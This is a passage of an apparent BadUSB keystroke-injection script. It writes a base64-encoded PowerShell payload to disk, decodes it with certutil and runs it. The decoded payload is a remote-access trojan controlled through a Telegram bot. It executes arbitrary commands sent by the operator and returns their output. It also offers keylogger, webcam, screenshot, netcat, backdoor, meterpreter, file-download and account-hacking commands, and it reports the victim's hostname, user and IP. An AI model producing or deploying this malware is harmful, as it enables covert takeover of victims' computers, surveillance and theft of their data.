ZS1XZWJSZXF1ZXN0IGANCiAgICAtVXJpICgiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHswfS9zZW5kTWVzc2FnZSIgLWYgJEJvdFRva2VuKSBgDQogICAgLU1ldGhvZCBQb3N0IGANCiAgICAtQ29udGVudFR5cGUgImFwcGxpY2F0aW9uL2pzb247Y2hhcnNldD11dGYtOCIgYA0KICAgIC1Cb2R5IChDb252ZXJ0VG8tSnNvbiAtQ29tcHJlc3MgLUlucHV0T2JqZWN0ICRwYXlsb2FkKQ0KDQoNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCiMjIFdBSVQgRk9SIENPTU1BTkQgIyMNCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCg0KI1RpbWUgdG8gc2xlZXAgZm9yIGVhY2ggbG9vcCBiZWZvcmUgY2hlY2tpbmcgaWYgYSBtZXNzYWdlIHdpdGggdGhlIG1hZ2ljIHdvcmQgd2FzIHJlY2VpdmVkDQokTG9vcFNsZWVwID0gMw0KIA0KIA0KI0dldCB0aGUgTGFzdCBNZXNzYWdlIFRpbWUgYXQgdGhlIGJlZ2lubmluZyBvZiB0aGUgc2NyaXB0OldoZW4gdGhlIHNjcmlwdCBpcyByYW4gdGhlIGZpcnN0IHRpbWUsIGl0IHdpbGwgaWdub3JlIGFueSBsYXN0IG1lc3NhZ2UgcmVjZWl2ZWQhDQokQm90VXBkYXRlcyA9IEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QkKCRCb3RUb2tlbikvZ2V0VXBkYXRlcyINCiRCb3RVcGRhdGVzUmVzdWx0cyA9IFthcnJheV0oJEJvdFVwZGF0ZXMgfCBDb252ZXJ0RnJvbS1Kc29uKS5yZXN1bHQNCiRMYXN0TWVzc2FnZVRpbWVfT3JpZ2luID0gJEJvdFVwZGF0ZXNSZXN1bHRzWyRCb3RVcGRhdGVzUmVzdWx0cy5Db3VudC0xXS5tZXNzYWdlLmRhdGUNCiANCiNSZWFkIHRoZSByZXNwb25zZXMgaW4gYSB3aGlsZSBjeWNsZQ0KJERvTm90RXhpdCA9IDENCiMkUHJldmlvdXNMb29wX0xhc3RNZXNzYWdlVGltZSBpcyBnb2luZyB0byBiZSB1cGRhdGVkIGF0IGV2ZXJ5IGN5Y2xlIChpZiB0aGUgbGFzdCBtZXNzYWdlIGRhdGUgY2hhbmdlcykNCiRQcmV2aW91c0xvb3BfTGFzdE1lc3NhZ2VUaW1lID0gJExhc3RNZXNzYWdlVGltZV9PcmlnaW4NCiANCiRTbGVlcFN0YXJ0VGltZSA9IFtGbG9hdF0gKGdldC1kYXRlIC1VRm9ybWF0ICVzKSAjVGhpcyB3aWxsIGJlIHVzZWQgdG8gY2hlY2sgaWYgdGhlICRTbGVlcFRpbWUgaGFzIHBhc3NlZCB5ZXQgYmVmb3JlIHNlbmRpbmcgYSBuZXcgbm90aWZpY2F0aW9uIG91dA0KV2hpbGUgKCREb05vdEV4aXQpICB7DQogIFNsZWVwIC1TZWNvbmRzICRMb29wU2xlZXANCiAgI1Jlc2V0IHZhcmlhYmxlcyB0aGF0IG1pZ2h0IGJlIGRpcnR5IGZyb20gdGhlIHByZXZpb3VzIGN5Y2xlDQogICRMYXN0TWVzc2FnZVRleHQgPSAiIg0KICAkQ29tbWFuZFRvUnVuID0gIiINCiAgJENvbW1hbmRUb1J1bl9SZXN1bHQgPSAiIg0KICAkQ29tbWFuZFRvUnVuX1NpbXBsaWZpZWRPdXRwdXQgPSAiIg0KICAkTWVzc2FnZSA9ICIiDQogIA0KICAjR2V0IHRoZSBjdXJyZW50IEJvdCBVcGRhdGVzIGFuZCBzdG9yZSB0aGVtIGluIGFuIGFycmF5IGZvcm1hdCB0byBtYWtlIGl0IGVhc2llcg0KICAkQm90VXBkYXRlcyA9IEludm9rZS1XZWJSZXF1ZXN0IC1VcmkgImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QkKCRCb3RUb2tlbikvZ2V0VXBkYXRlcyINCiAgJEJvdFVwZGF0ZXNSZXN1bHRzID0gW2FycmF5XSgkQm90VXBkYXRlcyB8IENvbnZlcnRGcm9tLUpzb24pLnJlc3VsdA0KICANCiAgI0dldCBqdXN0IHRoZSBsYXN0IG1lc3NhZ2U6DQogICRMYXN0TWVzc2FnZSA9ICRCb3RVcGRhdGVzUmVzdWx0c1skQm90VXBkYXRlc1Jlc3VsdHMuQ291bnQtMV0NCiAgI0dldCB0aGUgbGFzdCBtZXNzYWdlIHRpbWUNCiAgJExhc3RNZXNzYWdlVGltZSA9ICRMYXN0TWVzc2FnZS5tZXNzYWdlLmRhdGUNCiAgDQogICNJZiB0aGUgJExhc3RNZXNzYWdlVGltZSBpcyBuZXdlciB0aGFuICRQcmV2aW91c0xvb3BfTGFzdE1lc3NhZ2VUaW1lLCB0aGVuIHRoZSB1c2VyIGhhcyB0eXBlZCBzb21ldGhpbmchDQogIElmICgkTGFzdE1lc3NhZ2VUaW1lIC1ndCAkUHJldmlvdXNMb29wX0xhc3RNZXNzYWdlVGltZSkgIHsNCiAgICAjTG9va3MgbGlrZSB0aGVyZSdzIGEgbmV3IG1lc3NhZ2UhDQogICAgDQoJI1VwZGF0ZSAkUHJldmlvdXNMb29wX0xhc3RNZXNzYWdlVGltZSB3aXRoIHRoZSB0aW1lIGZyb20gdGhlIGxhdGVzdCBtZXNzYWdlDQoJJFByZXZpb3VzTG9vcF9MYXN0TWVzc2FnZVRpbWUgPSAkTGFzdE1lc3NhZ2VUaW1lDQoJI1VwZGF0ZSB0aGUgTGFzdE1lc3NhZ2VUaW1lDQoJJExhc3RNZXNzYWdlVGltZSA9ICRMYXN0TWVzc2FnZS5NZXNzYWdlLkRhdGUNCgkjVXBkYXRlIHRoZSAkTGFzdE1lc3NhZ2VUZXh0DQoJJExhc3RNZXNzYWdlVGV4dCA9ICRMYXN0TWVzc2FnZS5NZXNzYWdlLlRleHQNCgkNCglTd2l0Y2ggLVdpbGRjYXJkICgkTGFzdE1lc3NhZ2VUZXh0KSAgew0KCSAgIi9zZWxlY3QgJGlwVjQgKiIgIHsgI0ltcG9ydGFudDogcnVuIHdpdGggYSBzcGFjZQ0KCSAgICAjVGhlIHVzZXIgd2FudHMgdG8gcnVuIGEgY29tbWFuZA0KCQkkQ29tbWFuZFRvUnVuID0gKCRMYXN0TWVzc2FnZVRleHQgLXNwbGl0ICgiL3NlbGVjdCAkaXBWNCAiKSlbMV0gI1RoaXMgd2lsbCByZW1vdmUgInJ1biAiDQoJCSMkTWVzc2FnZSA9ICJPayAkKCRMYXN0TWVzc2FnZS5NZXNzYWdlLmZyb20uZmlyc3RfbmFtZSksIEkgd2lsbCB0cnkgdG8gcnVuIHRoZSBmb2xsb3dpbmcgY29tbWFuZCBvbiAkaXBWNCA6IGBuPGI+JCgkQ29tbWFuZFRvUnVuKTwvYj4iDQoJCSMkU2VuZE1lc3NhZ2UgPSBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JCgkQm90VG9rZW4pL3NlbmRNZXNzYWdlP2NoYXRfaWQ9JCgkQ2hhdElEKSZ0ZXh0PSQoJE1lc3NhZ2UpJnBhcnNlX21vZGU9aHRtbCINCgkJDQoJCSNSdW4gdGhlIGNvbW1hbmQNCgkJVHJ5IHsNCgkJICBJbnZva2UtRXhwcmVzc2lvbiAkQ29tbWFuZFRvUnVuIHwgT3V0LVN0cmluZyB8ICUgIHsNCgkJICAgICRDb21tYW5kVG9SdW5fUmVzdWx0ICs9ICJgbiAkKCRfKSINCgkJICB9DQoJCX0NCgkJQ2F0Y2ggIHsNCgkJICAkQ29tbWFuZFRvUnVuX1Jlc3VsdCA9ICRfLkV4Y2VwdGlvbi5NZXNzYWdlDQoJCX0NCgkJDQoJCSRNZXNzYWdlID0gIiQoJExhc3RNZXNzYWdlLk1lc3NhZ2UuZnJvbS5maXJzdF9uYW1lKSwgSSd2ZSByYW4gPGI+JCgkQ29tbWFuZFRvUnVuKTwvYj4gYW5kIHRoaXMgaXMgdGhlIG91dHB1dDpgbiRDb21tYW5kVG9SdW5fUmVzdWx0Ig0KCQkkU2VuZE1lc3NhZ2UgPSBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JCgkQm90VG9rZW4pL3NlbmRNZXNzYWdlP2NoYXRfaWQ9JCgkQ2hhdElEKSZ0ZXh0PSQoJE1lc3NhZ2UpJnBhcnNlX21vZGU9aHRtbCINCiAgICAgICAgJHB3ZCA9IHB3ZA0KICAgICAgICAkaW5mbyA9ICdbIV0gJyArICRob3N0bmFtZSArICcgLSAnICsgJHdob2FtaSArICcgLSAnICsgJGlwdjQgKyAnICcgKyAkcHdkICsgJz4gJw0KCQlJbnZva2UtUmVzdE1ldGhvZCAtVXJpICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JCgkQm90VG9rZW4pL3NlbmRNZXNzYWdlP2NoYXRfaWQ9JCgkQ2hhdElEKSZ0ZXh0PSQoJGluZm8pIg0KCSAgfQ0KCSAgIi9zdG9wICRpcFY0IiAgew0KCQkjVGhlIHVzZXIgd2FudHMgdG8gc3RvcCB0aGUgc2NyaXB0DQoJCXdyaXRlLWhvc3QgIlRoZSBzY3JpcHQgd2lsbCBlbmQgaW4gNSBzZWNvbmRzIg0KCQkkRXhpdE1lc3NhZ2UgPSAiJCgkTGFzdE1lc3NhZ2UuTWVzc2FnZS5mcm9tLmZpcnN0X25hbWUpIGhhcyByZXF1ZXN0ZWQgdGhlIHNjcmlwdCB0byBiZSB0ZXJtaW5hdGVkLiBJdCB3aWxsIG5lZWQgdG8gYmUgc3RhcnRlZCBhZ2FpbiBpbiBvcmRlciB0byBhY2NlcHQgbmV3IG1lc3NhZ2VzISINCgkJJEV4aXRSZXN0UmVzcG9uc2UgPSBJbnZva2UtUmVzdE1ldGhvZCAtVXJpICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JCgkQm90VG9rZW4pL3NlbmRNZXNzYWdlP2NoYXRfaWQ9JCgkQ2hhdElEKSZ0ZXh0PSQoJEV4aXRNZXNzYWdlKSZwYXJzZV9tb2RlPWh0bWwiDQoJCVNsZWVwIC1zZWNvbmRzIDUNCgkJJERvTm90RXhpdCA9IDANCgkgIH0NCiAgICAgICIvbGlzdCIgIHsNCiAgICAgICAgSW52b2tlLVdlYlJlcXVlc3QgYA0KICAgICAgICAtVXJpICgiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHswfS9zZW5kTWVzc2FnZSIgLWYgJEJvdFRva2VuKSBgDQogICAgICAgIC1NZXRob2QgUG9zdCBgDQogICAgICAgIC1Db250ZW50VHlwZSAiYXBwbGljYXRpb24vanNvbjtjaGFyc2V0PXV0Zi04IiBgDQogICAgICAgIC1Cb2R5IChDb252ZXJ0VG8tSnNvbiAtQ29tcHJlc3MgLUlucHV0T2JqZWN0ICRwYXlsb2FkKQ0KICAgICAgfQ0KICAgICAgIi9zY3JlZW5zaG90ICRpcFY0InsNCiAgICAgICAgc2NyZWVuc2hvdA0KICAgICAgICBzZW5kUGhvdG8NCiAgICAgIH0NCiAgICAgICIvYmFja2Rvb3IgJGlwVjQiICB7DQogICAgICAgIGJhY2tkb29yDQogICAgICB9DQogICAgICAiL21ldGVycHJldGVyICRpcFY0IiAgew0KICAgICAgICAgDQogICAgICB9DQogICAgICAiL2NsZWFuQWxsICRpcFY0IiB7DQogICAgICAgIGNsZWFuQWxsDQogICAgICB9DQogICAgICAiL2lwUHVibGljICRpcFY0IiB7DQogICAgICAgIGlwUHVibGljDQogICAgICB9DQogICAgICAiL2Rvd25sb2FkICRpcFY0ICoiew0KICAgICAgICAkRmlsZVRvRG93bmxvYWQgPSAoJExhc3RNZXNzYWdlVGV4dCAtc3BsaXQgKCIvZG93bmxvYWQgJGlwVjQgIikpWzFdDQogICAgICAgIGRvd25sb2FkICRGaWxlVG9Eb3dubG9hZA0KICAgICAgfQ0KICAgICAgIi9oYWNrVCAkaXBWNCJ7DQogICAgICAgIEhhY2tUd2l0dGVyVzEwDQogICAgICB9DQogICAgICAiL3dlYmNhbSAkaXBWNCJ7DQogICAgICAgIHdlYmNhbQ0KICAgICAgfQ0KICAgICAgIi9oYWNrVyAkaXBWNCJ7DQogICAgICAgIGhhY2tXaGF0c0FQUFcxMA0KICAgICAgfQ0KICAgICAgIi9rZXlsb2dnZXIgJGlwVjQgKiJ7DQogICAgICAgICR0aW1lID0gKCRMYXN0TWVzc2FnZVRleHQgLXNwbGl0ICgiL2tleWxvZ2dlciAkaXBWNCAiKSlbMV0NCiAgICAgICAga2V5bG9nZ2VyIHNlY29uZHMgJHRpbWUNCiAgICAgIH0NCiAgICAgICIvbmMgJGlwVjQgKiJ7DQogICAgICAgICRpcCA9ICgkTGFzdE1lc3NhZ2VUZXh0IC1zcGxpdCAoIi9uYyAkaXBWNCAiKSlbMV0NCiAgICAgICAgbmV0Y2F0ICRpcA0KICAgICAgfQ0KICAgICAgIi9zdG9wbmMgJGlwVjQiew0KICAgICAgICBzdG9wbmV0Y2F0DQogICAgICB9DQogICAgICAiL3N0YXJ0dHdpdGNoICRpcFY0ICoiew0KICAgICAgICAkU1RSRUFNX0tFWSA9ICgkTGFzdE1lc3NhZ2VUZXh0IC1zcGxpdCAoIi90d2l0Y2ggJGlwVjQgIikpWzFdDQogICAgICAgIHR3aXRjaCAkU1RSRUFNX0tFWQ0KICAgICAgfQ0KICAgICAgIi9zdG9wdHdpdGNoICRpcFY0InsNCiAgICAgICAgc3RvcHR3aXRjaA0KICAgICAgfQ0KCSAgZGVmYXVsdCAgew0KCSAgICAjVGhlIG1lc3NhZ2Ugc2VudCBpcyB1bmtub3duDQoJCSRNZXNzYWdlID0gIlNvcnJ5ICQoJExhc3RNZXNzYWdlLk1lc3NhZ2UuZnJvbS5maXJzdF9uYW1lKSwgYnV0IEkgZG9uJ3QgdW5kZXJzdGFuZCAiIiQoJExhc3RNZXNzYWdlVGV4dCkiIiEiDQoJCSRTZW5kTWVzc2FnZSA9IEludm9rZS1SZXN0TWV0aG9kIC1VcmkgImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QkKCRCb3RUb2tlbikvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0kKCRDaGF0SUQpJnRleHQ9JCgkTWVzc2FnZSkmcGFyc2VfbW9kZT1odG1sIg0KCSAgfQ0KCX0NCgkNCiAgfQ0KfQ0K > "$TempFile"; certutil -f -decode "$TempFile" "$File" | out-null; & "$env:TEMP\l.ps1"
DELAY 1000
ENTER
